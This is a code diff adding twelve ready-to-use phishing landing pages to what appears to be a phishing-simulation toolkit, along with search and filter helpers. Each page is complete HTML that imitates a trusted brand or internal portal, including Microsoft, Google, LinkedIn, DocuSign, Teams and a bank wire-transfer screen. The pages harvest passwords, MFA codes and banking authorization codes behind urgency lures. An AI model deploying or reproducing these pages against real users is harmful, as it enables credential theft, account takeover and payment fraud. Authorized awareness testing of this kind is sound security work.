@@ -1630,8 +1630,154 @@ export const PHISHING_TEMPLATES: PhishingTemplate[] = [
   },
 ];
 
+// ============================================================
+// LANDING PAGE TEMPLATES
+// ============================================================
+
+export interface LandingPageTemplate {
+  id: string;
+  name: string;
+  category: TemplateCategory;
+  description: string;
+  tags: string[];
+  captureFields: string[];
+  redirectUrl: string;
+  htmlContent: string;
+}
+
+export const LANDING_PAGE_TEMPLATES: LandingPageTemplate[] = [
+  {
+    id: "lp-it-login",
+    name: "IT Portal Login",
+    category: "it-helpdesk",
+    description: "Corporate IT portal login page mimicking internal SSO. Captures email and password.",
+    tags: ["sso", "login", "it-portal", "credential-harvest"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>IT Portal — Sign In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:40px;width:100%;max-width:400px}.logo{text-align:center;margin-bottom:24px;font-size:20px;font-weight:700;color:#0078d4}.form-group{margin-bottom:16px}label{display:block;font-size:13px;color:#555;margin-bottom:6px}input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;font-size:14px}input:focus{outline:none;border-color:#0078d4}.btn{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}.btn:hover{background:#006abc}.footer{text-align:center;margin-top:16px;font-size:11px;color:#999}</style></head><body><div class="card"><div class="logo">🔒 IT Portal</div><form method="POST"><div class="form-group"><label>Email Address</label><input type="email" name="email" required placeholder="you@company.com"></div><div class="form-group"><label>Password</label><input type="password" name="password" required placeholder="Enter your password"></div><button type="submit" class="btn">Sign In</button></form><div class="footer">Protected by IT Security • {{.BaseURL}}</div></div></body></html>`,
+  },
+  {
+    id: "lp-it-mfa",
+    name: "IT MFA Verification",
+    category: "it-helpdesk",
+    description: "Multi-factor authentication verification page. Captures MFA token after credential harvest.",
+    tags: ["mfa", "2fa", "verification", "it-portal"],
+    captureFields: ["mfa_code"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Your Identity</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:40px;width:100%;max-width:400px;text-align:center}.icon{font-size:48px;margin-bottom:16px}h2{font-size:18px;margin-bottom:8px;color:#333}p{font-size:13px;color:#666;margin-bottom:24px}input{width:100%;padding:14px;border:1px solid #ddd;border-radius:4px;font-size:24px;text-align:center;letter-spacing:8px}input:focus{outline:none;border-color:#0078d4}.btn{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px}.btn:hover{background:#006abc}</style></head><body><div class="card"><div class="icon">🔐</div><h2>Verify Your Identity</h2><p>Enter the 6-digit code from your authenticator app</p><form method="POST"><input type="text" name="mfa_code" maxlength="6" pattern="[0-9]{6}" required placeholder="000000"><button type="submit" class="btn">Verify</button></form></div></body></html>`,
+  },
+  {
+    id: "lp-password-reset",
+    name: "Password Reset Portal",
+    category: "password-auth",
+    description: "Password reset page that captures current and new passwords. Mimics corporate password management.",
+    tags: ["password-reset", "credential-harvest", "password-change"],
+    captureFields: ["email", "current_password", "new_password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Password Reset</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#16213e;border-radius:12px;padding:40px;width:100%;max-width:420px;color:#e0e0e0}.header{text-align:center;margin-bottom:28px}.header h2{font-size:20px;color:#fff}.header p{font-size:13px;color:#888;margin-top:6px}.form-group{margin-bottom:16px}label{display:block;font-size:12px;color:#aaa;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}input{width:100%;padding:12px;background:#0f3460;border:1px solid #1a4080;border-radius:6px;color:#fff;font-size:14px}input:focus{outline:none;border-color:#e94560}.btn{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}.btn:hover{background:#c73e54}.note{text-align:center;margin-top:16px;font-size:11px;color:#666}</style></head><body><div class="card"><div class="header"><h2>🔑 Reset Your Password</h2><p>Your password has expired. Please set a new one.</p></div><form method="POST"><div class="form-group"><label>Email</label><input type="email" name="email" required placeholder="you@company.com"></div><div class="form-group"><label>Current Password</label><input type="password" name="current_password" required></div><div class="form-group"><label>New Password</label><input type="password" name="new_password" required></div><button type="submit" class="btn">Update Password</button></form><div class="note">Password must be 12+ characters with uppercase, number, and symbol.</div></div></body></html>`,
+  },
+  {
+    id: "lp-cloud-onedrive",
+    name: "OneDrive File Access",
+    category: "cloud-services",
+    description: "OneDrive/SharePoint file access page requiring Microsoft login. Captures Microsoft credentials.",
+    tags: ["onedrive", "sharepoint", "microsoft", "file-share"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to your account</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}.logo{margin-bottom:16px;font-size:22px;font-weight:600;color:#1b1b1b}h2{font-size:15px;color:#1b1b1b;margin-bottom:24px;font-weight:400}input{width:100%;padding:8px 10px;border:none;border-bottom:1px solid #666;font-size:15px;margin-bottom:24px;color:#1b1b1b}input:focus{outline:none;border-bottom-color:#0067b8}.btn{padding:8px 30px;background:#0067b8;color:#fff;border:none;font-size:14px;cursor:pointer;float:right}.btn:hover{background:#005da6}.links{margin-top:40px;clear:both}.links a{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin-bottom:8px}.links a:hover{text-decoration:underline}</style></head><body><div class="card"><div class="logo">Microsoft</div><h2>Sign in</h2><form method="POST"><input type="email" name="email" required placeholder="Email, phone, or Skype"><input type="password" name="password" required placeholder="Password"><button type="submit" class="btn">Sign in</button></form><div class="links"><a href="#">Can't access your account?</a><a href="#">Sign-in options</a></div></div></body></html>`,
+  },
+  {
+    id: "lp-financial-wire",
+    name: "Wire Transfer Authorization",
+    category: "financial",
+    description: "Banking portal for wire transfer authorization. Captures banking credentials and authorization codes.",
+    tags: ["wire-transfer", "banking", "financial", "authorization"],
+    captureFields: ["account_id", "password", "auth_code"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Secure Wire Authorization</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a1628;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:4px;padding:36px;width:100%;max-width:440px}.header{border-bottom:3px solid #003366;padding-bottom:16px;margin-bottom:24px}.header h2{font-size:18px;color:#003366}.header p{font-size:12px;color:#666;margin-top:4px}.alert{background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:12px;margin-bottom:20px;font-size:13px;color:#856404}.form-group{margin-bottom:16px}label{display:block;font-size:13px;color:#333;margin-bottom:4px;font-weight:600}input{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px}input:focus{outline:none;border-color:#003366}.btn{width:100%;padding:12px;background:#003366;color:#fff;border:none;border-radius:3px;font-size:14px;font-weight:600;cursor:pointer}.btn:hover{background:#002244}.footer{text-align:center;margin-top:16px;font-size:10px;color:#999}</style></head><body><div class="card"><div class="header"><h2>🏦 Secure Wire Authorization</h2><p>Multi-factor authentication required</p></div><div class="alert">⚠ A wire transfer of $47,500.00 requires your authorization.</div><form method="POST"><div class="form-group"><label>Account ID</label><input type="text" name="account_id" required></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><div class="form-group"><label>Authorization Code</label><input type="text" name="auth_code" required placeholder="From your security token"></div><button type="submit" class="btn">Authorize Transfer</button></form><div class="footer">Secured by 256-bit encryption • Session expires in 5:00</div></div></body></html>`,
+  },
+  {
+    id: "lp-hr-benefits",
+    name: "HR Benefits Portal",
+    category: "hr-corporate",
+    description: "HR benefits enrollment portal. Captures employee credentials and personal information.",
+    tags: ["hr", "benefits", "enrollment", "employee-portal"],
+    captureFields: ["employee_id", "email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Benefits Portal — Open Enrollment</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:40px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,.3)}.badge{display:inline-block;background:#10b981;color:#fff;padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600;margin-bottom:16px}h2{font-size:20px;color:#333;margin-bottom:6px}p{font-size:13px;color:#666;margin-bottom:24px}.form-group{margin-bottom:16px}label{display:block;font-size:12px;color:#555;margin-bottom:6px;font-weight:500}input{width:100%;padding:11px 14px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:border-color .2s}input:focus{outline:none;border-color:#667eea}.btn{width:100%;padding:12px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}.btn:hover{opacity:.9}.footer{text-align:center;margin-top:16px;font-size:11px;color:#999}</style></head><body><div class="card"><div class="badge">OPEN ENROLLMENT</div><h2>Benefits Portal</h2><p>Sign in to review and update your benefits selections. Enrollment closes Friday.</p><form method="POST"><div class="form-group"><label>Employee ID</label><input type="text" name="employee_id" required placeholder="EMP-XXXXX"></div><div class="form-group"><label>Email</label><input type="email" name="email" required placeholder="you@company.com"></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><button type="submit" class="btn">Access Benefits</button></form><div class="footer">Human Resources Department • Confidential</div></div></body></html>`,
+  },
+  {
+    id: "lp-social-linkedin",
+    name: "LinkedIn Login",
+    category: "social-media",
+    description: "LinkedIn-style login page for viewing connection requests or messages. Captures LinkedIn credentials.",
+    tags: ["linkedin", "social-media", "login", "credential-harvest"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>LinkedIn Login</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f3f2ef;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}.logo{font-size:28px;font-weight:700;color:#0a66c2;margin-bottom:8px}.subtitle{font-size:14px;color:#666;margin-bottom:24px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);padding:24px;width:100%;max-width:400px}.form-group{margin-bottom:16px}label{display:block;font-size:14px;color:#333;margin-bottom:4px}input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:16px}input:focus{outline:none;border-color:#0a66c2}.btn{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}.btn:hover{background:#004182}.divider{text-align:center;margin:16px 0;color:#999;font-size:13px}.links{text-align:center;margin-top:12px}.links a{color:#0a66c2;text-decoration:none;font-size:14px;font-weight:600}</style></head><body><div class="logo">Linked<span style="color:#0a66c2">in</span></div><div class="subtitle">Sign in to view your notifications</div><div class="card"><form method="POST"><div class="form-group"><label>Email or Phone</label><input type="text" name="email" required></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><button type="submit" class="btn">Sign in</button></form><div class="divider">or</div><div class="links"><a href="#">Forgot password?</a></div></div></body></html>`,
+  },
+  {
+    id: "lp-software-update",
+    name: "Software Update Portal",
+    category: "software-update",
+    description: "Software update download portal requiring authentication. Captures credentials before fake download.",
+    tags: ["software-update", "download", "security-patch"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Security Update Required</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#111;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#1e1e1e;border:1px solid #333;border-radius:8px;padding:36px;width:100%;max-width:440px}.alert-bar{background:#e94560;color:#fff;padding:10px 16px;border-radius:6px;font-size:13px;font-weight:600;margin-bottom:20px;text-align:center}h2{font-size:18px;margin-bottom:8px}p{font-size:13px;color:#999;margin-bottom:20px}.form-group{margin-bottom:16px}label{display:block;font-size:12px;color:#aaa;margin-bottom:6px}input{width:100%;padding:10px;background:#2a2a2a;border:1px solid #444;border-radius:4px;color:#fff;font-size:14px}input:focus{outline:none;border-color:#e94560}.btn{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}.btn:hover{background:#c73e54}.info{margin-top:16px;padding:12px;background:#2a2a2a;border-radius:4px;font-size:12px;color:#888}</style></head><body><div class="card"><div class="alert-bar">⚠ CRITICAL SECURITY UPDATE</div><h2>Authenticate to Download</h2><p>A critical security patch is required for your system. Sign in to download.</p><form method="POST"><div class="form-group"><label>Corporate Email</label><input type="email" name="email" required></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><button type="submit" class="btn">Download Update</button></form><div class="info">Update: CVE-2024-XXXX Patch • Size: 24.3 MB • Required by IT Policy</div></div></body></html>`,
+  },
+  {
+    id: "lp-delivery-tracking",
+    name: "Package Tracking Portal",
+    category: "delivery-shipping",
+    description: "Package tracking portal requiring login to view delivery status. Captures credentials.",
+    tags: ["delivery", "tracking", "shipping", "package"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Track Your Package</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#faf5f0;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:36px;width:100%;max-width:420px}.header{text-align:center;margin-bottom:24px}.header .icon{font-size:40px;margin-bottom:8px}.header h2{font-size:18px;color:#333}.header p{font-size:13px;color:#888;margin-top:4px}.tracking-box{background:#f0f9ff;border:1px solid #bae6fd;border-radius:6px;padding:12px;margin-bottom:20px;text-align:center;font-family:monospace;font-size:16px;color:#0369a1;letter-spacing:2px}.form-group{margin-bottom:16px}label{display:block;font-size:13px;color:#555;margin-bottom:4px}input{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;font-size:14px}input:focus{outline:none;border-color:#8b5cf6}.btn{width:100%;padding:12px;background:#8b5cf6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}.btn:hover{background:#7c3aed}</style></head><body><div class="card"><div class="header"><div class="icon">📦</div><h2>Track Your Package</h2><p>Sign in to view delivery details</p></div><div class="tracking-box">1Z999AA10123456784</div><form method="POST"><div class="form-group"><label>Email</label><input type="email" name="email" required></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><button type="submit" class="btn">View Tracking</button></form></div></body></html>`,
+  },
+  {
+    id: "lp-exec-docusign",
+    name: "DocuSign Document Review",
+    category: "executive-impersonation",
+    description: "DocuSign-style document review page. Captures credentials to view a supposedly shared executive document.",
+    tags: ["docusign", "document", "executive", "bec"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Review Document</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:4px;box-shadow:0 1px 6px rgba(0,0,0,.12);padding:0;width:100%;max-width:480px;overflow:hidden}.brand{background:#ffc800;padding:16px 24px;display:flex;align-items:center;gap:10px;font-size:20px;font-weight:700;color:#1b1b1b}.content{padding:32px 24px}.content h3{font-size:16px;color:#333;margin-bottom:8px}.content p{font-size:13px;color:#666;margin-bottom:20px}.doc-preview{background:#f8f8f8;border:1px dashed #ddd;border-radius:4px;padding:24px;text-align:center;margin-bottom:20px;color:#999;font-size:13px}.form-group{margin-bottom:14px}label{display:block;font-size:12px;color:#555;margin-bottom:4px}input{width:100%;padding:10px;border:1px solid #ddd;border-radius:3px;font-size:14px}input:focus{outline:none;border-color:#ffc800}.btn{width:100%;padding:12px;background:#ffc800;color:#1b1b1b;border:none;border-radius:3px;font-size:14px;font-weight:700;cursor:pointer}.btn:hover{background:#e6b400}</style></head><body><div class="card"><div class="brand">✉ DocuSign</div><div class="content"><h3>Document Shared With You</h3><p>The CEO has shared a confidential document that requires your review and signature.</p><div class="doc-preview">📄 Q4_Strategic_Plan_CONFIDENTIAL.pdf<br><span style="font-size:11px">Sign in to view and sign</span></div><form method="POST"><div class="form-group"><label>Email</label><input type="email" name="email" required></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><button type="submit" class="btn">VIEW DOCUMENT</button></form></div></div></body></html>`,
+  },
+  {
+    id: "lp-calendar-teams",
+    name: "Teams Meeting Join",
+    category: "calendar-meeting",
+    description: "Microsoft Teams meeting join page requiring authentication. Captures Microsoft credentials.",
+    tags: ["teams", "meeting", "microsoft", "calendar"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Join Teams Meeting</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);padding:40px;width:100%;max-width:400px;text-align:center}.logo{font-size:24px;font-weight:600;color:#5b5fc7;margin-bottom:8px}.subtitle{font-size:14px;color:#666;margin-bottom:24px}.meeting-info{background:#f0f0ff;border-radius:8px;padding:16px;margin-bottom:24px;text-align:left}.meeting-info .title{font-size:14px;font-weight:600;color:#333}.meeting-info .time{font-size:12px;color:#888;margin-top:4px}.meeting-info .org{font-size:12px;color:#5b5fc7;margin-top:4px}.form-group{margin-bottom:14px;text-align:left}label{display:block;font-size:13px;color:#333;margin-bottom:4px}input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px}input:focus{outline:none;border-color:#5b5fc7}.btn{width:100%;padding:12px;background:#5b5fc7;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}.btn:hover{background:#4a4eb5}</style></head><body><div class="card"><div class="logo">Microsoft Teams</div><div class="subtitle">Sign in to join the meeting</div><div class="meeting-info"><div class="title">Q4 Budget Review — Urgent</div><div class="time">Today at 2:00 PM • 30 min</div><div class="org">Organized by CFO</div></div><form method="POST"><div class="form-group"><label>Email</label><input type="email" name="email" required></div><div class="form-group"><label>Password</label><input type="password" name="password" required></div><button type="submit" class="btn">Join Meeting</button></form></div></body></html>`,
+  },
+  {
+    id: "lp-cloud-google",
+    name: "Google Workspace Login",
+    category: "cloud-services",
+    description: "Google Workspace login page for accessing shared documents. Captures Google credentials.",
+    tags: ["google", "workspace", "gdrive", "credential-harvest"],
+    captureFields: ["email", "password"],
+    redirectUrl: "{{.BaseURL}}/redirect",
+    htmlContent: `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Google Sans','Roboto',sans-serif;background:#f8f9fa;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:8px;border:1px solid #dadce0;padding:48px 40px;width:100%;max-width:450px}.logo{text-align:center;margin-bottom:16px;font-size:24px}h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}p{font-size:16px;color:#5f6368;text-align:center;margin-bottom:32px}.form-group{margin-bottom:24px}input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124}input:focus{outline:none;border:2px solid #1a73e8}.links{margin-bottom:32px}.links a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}.actions{display:flex;justify-content:space-between;align-items:center}.actions a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}.btn{padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}.btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.3)}</style></head><body><div class="card"><div class="logo">🔵🔴🟡🟢</div><h1>Sign in</h1><p>to continue to Google Drive</p><form method="POST"><div class="form-group"><input type="email" name="email" required placeholder="Email or phone"></div><div class="form-group"><input type="password" name="password" required placeholder="Enter your password"></div><div class="links"><a href="#">Forgot email?</a></div><div class="actions"><a href="#">Create account</a><button type="submit" class="btn">Next</button></div></form></div></body></html>`,
+  },
+];
+
+// ============================================================
+// UTILITY FUNCTIONS
+// ============================================================
+
 export function getTemplatesByCategory(category: TemplateCategory): PhishingTemplate[] {
   return PHISHING_TEMPLATES.filter(t => t.category === category);
+}
+
+export function getLandingPagesByCategory(category: TemplateCategory): LandingPageTemplate[] {
+  return LANDING_PAGE_TEMPLATES.filter(t => t.category === category);
 }
 
 export function searchTemplates(query: string): PhishingTemplate[] {
@@ -1640,6 +1786,16 @@ export function searchTemplates(query: string): PhishingTemplate[] {
     (t.name || '').toLowerCase().includes(lower) ||
     (t.description || '').toLowerCase().includes(lower) ||
     (t.subjectLine || '').toLowerCase().includes(lower) ||
+    t.tags.some(tag => tag.toLowerCase().includes(lower)) ||
+    (t.category || '').toLowerCase().includes(lower)
+  );
+}
+
+export function searchLandingPages(query: string): LandingPageTemplate[] {
+  const lower = query.toLowerCase();
+  return LANDING_PAGE_TEMPLATES.filter(t =>
+    (t.name || '').toLowerCase().includes(lower) ||
+    (t.description || '').toLowerCase().includes(lower) ||
     t.tags.some(tag => tag.toLowerCase().includes(lower)) ||
     (t.category || '').toLowerCase().includes(lower)
   );
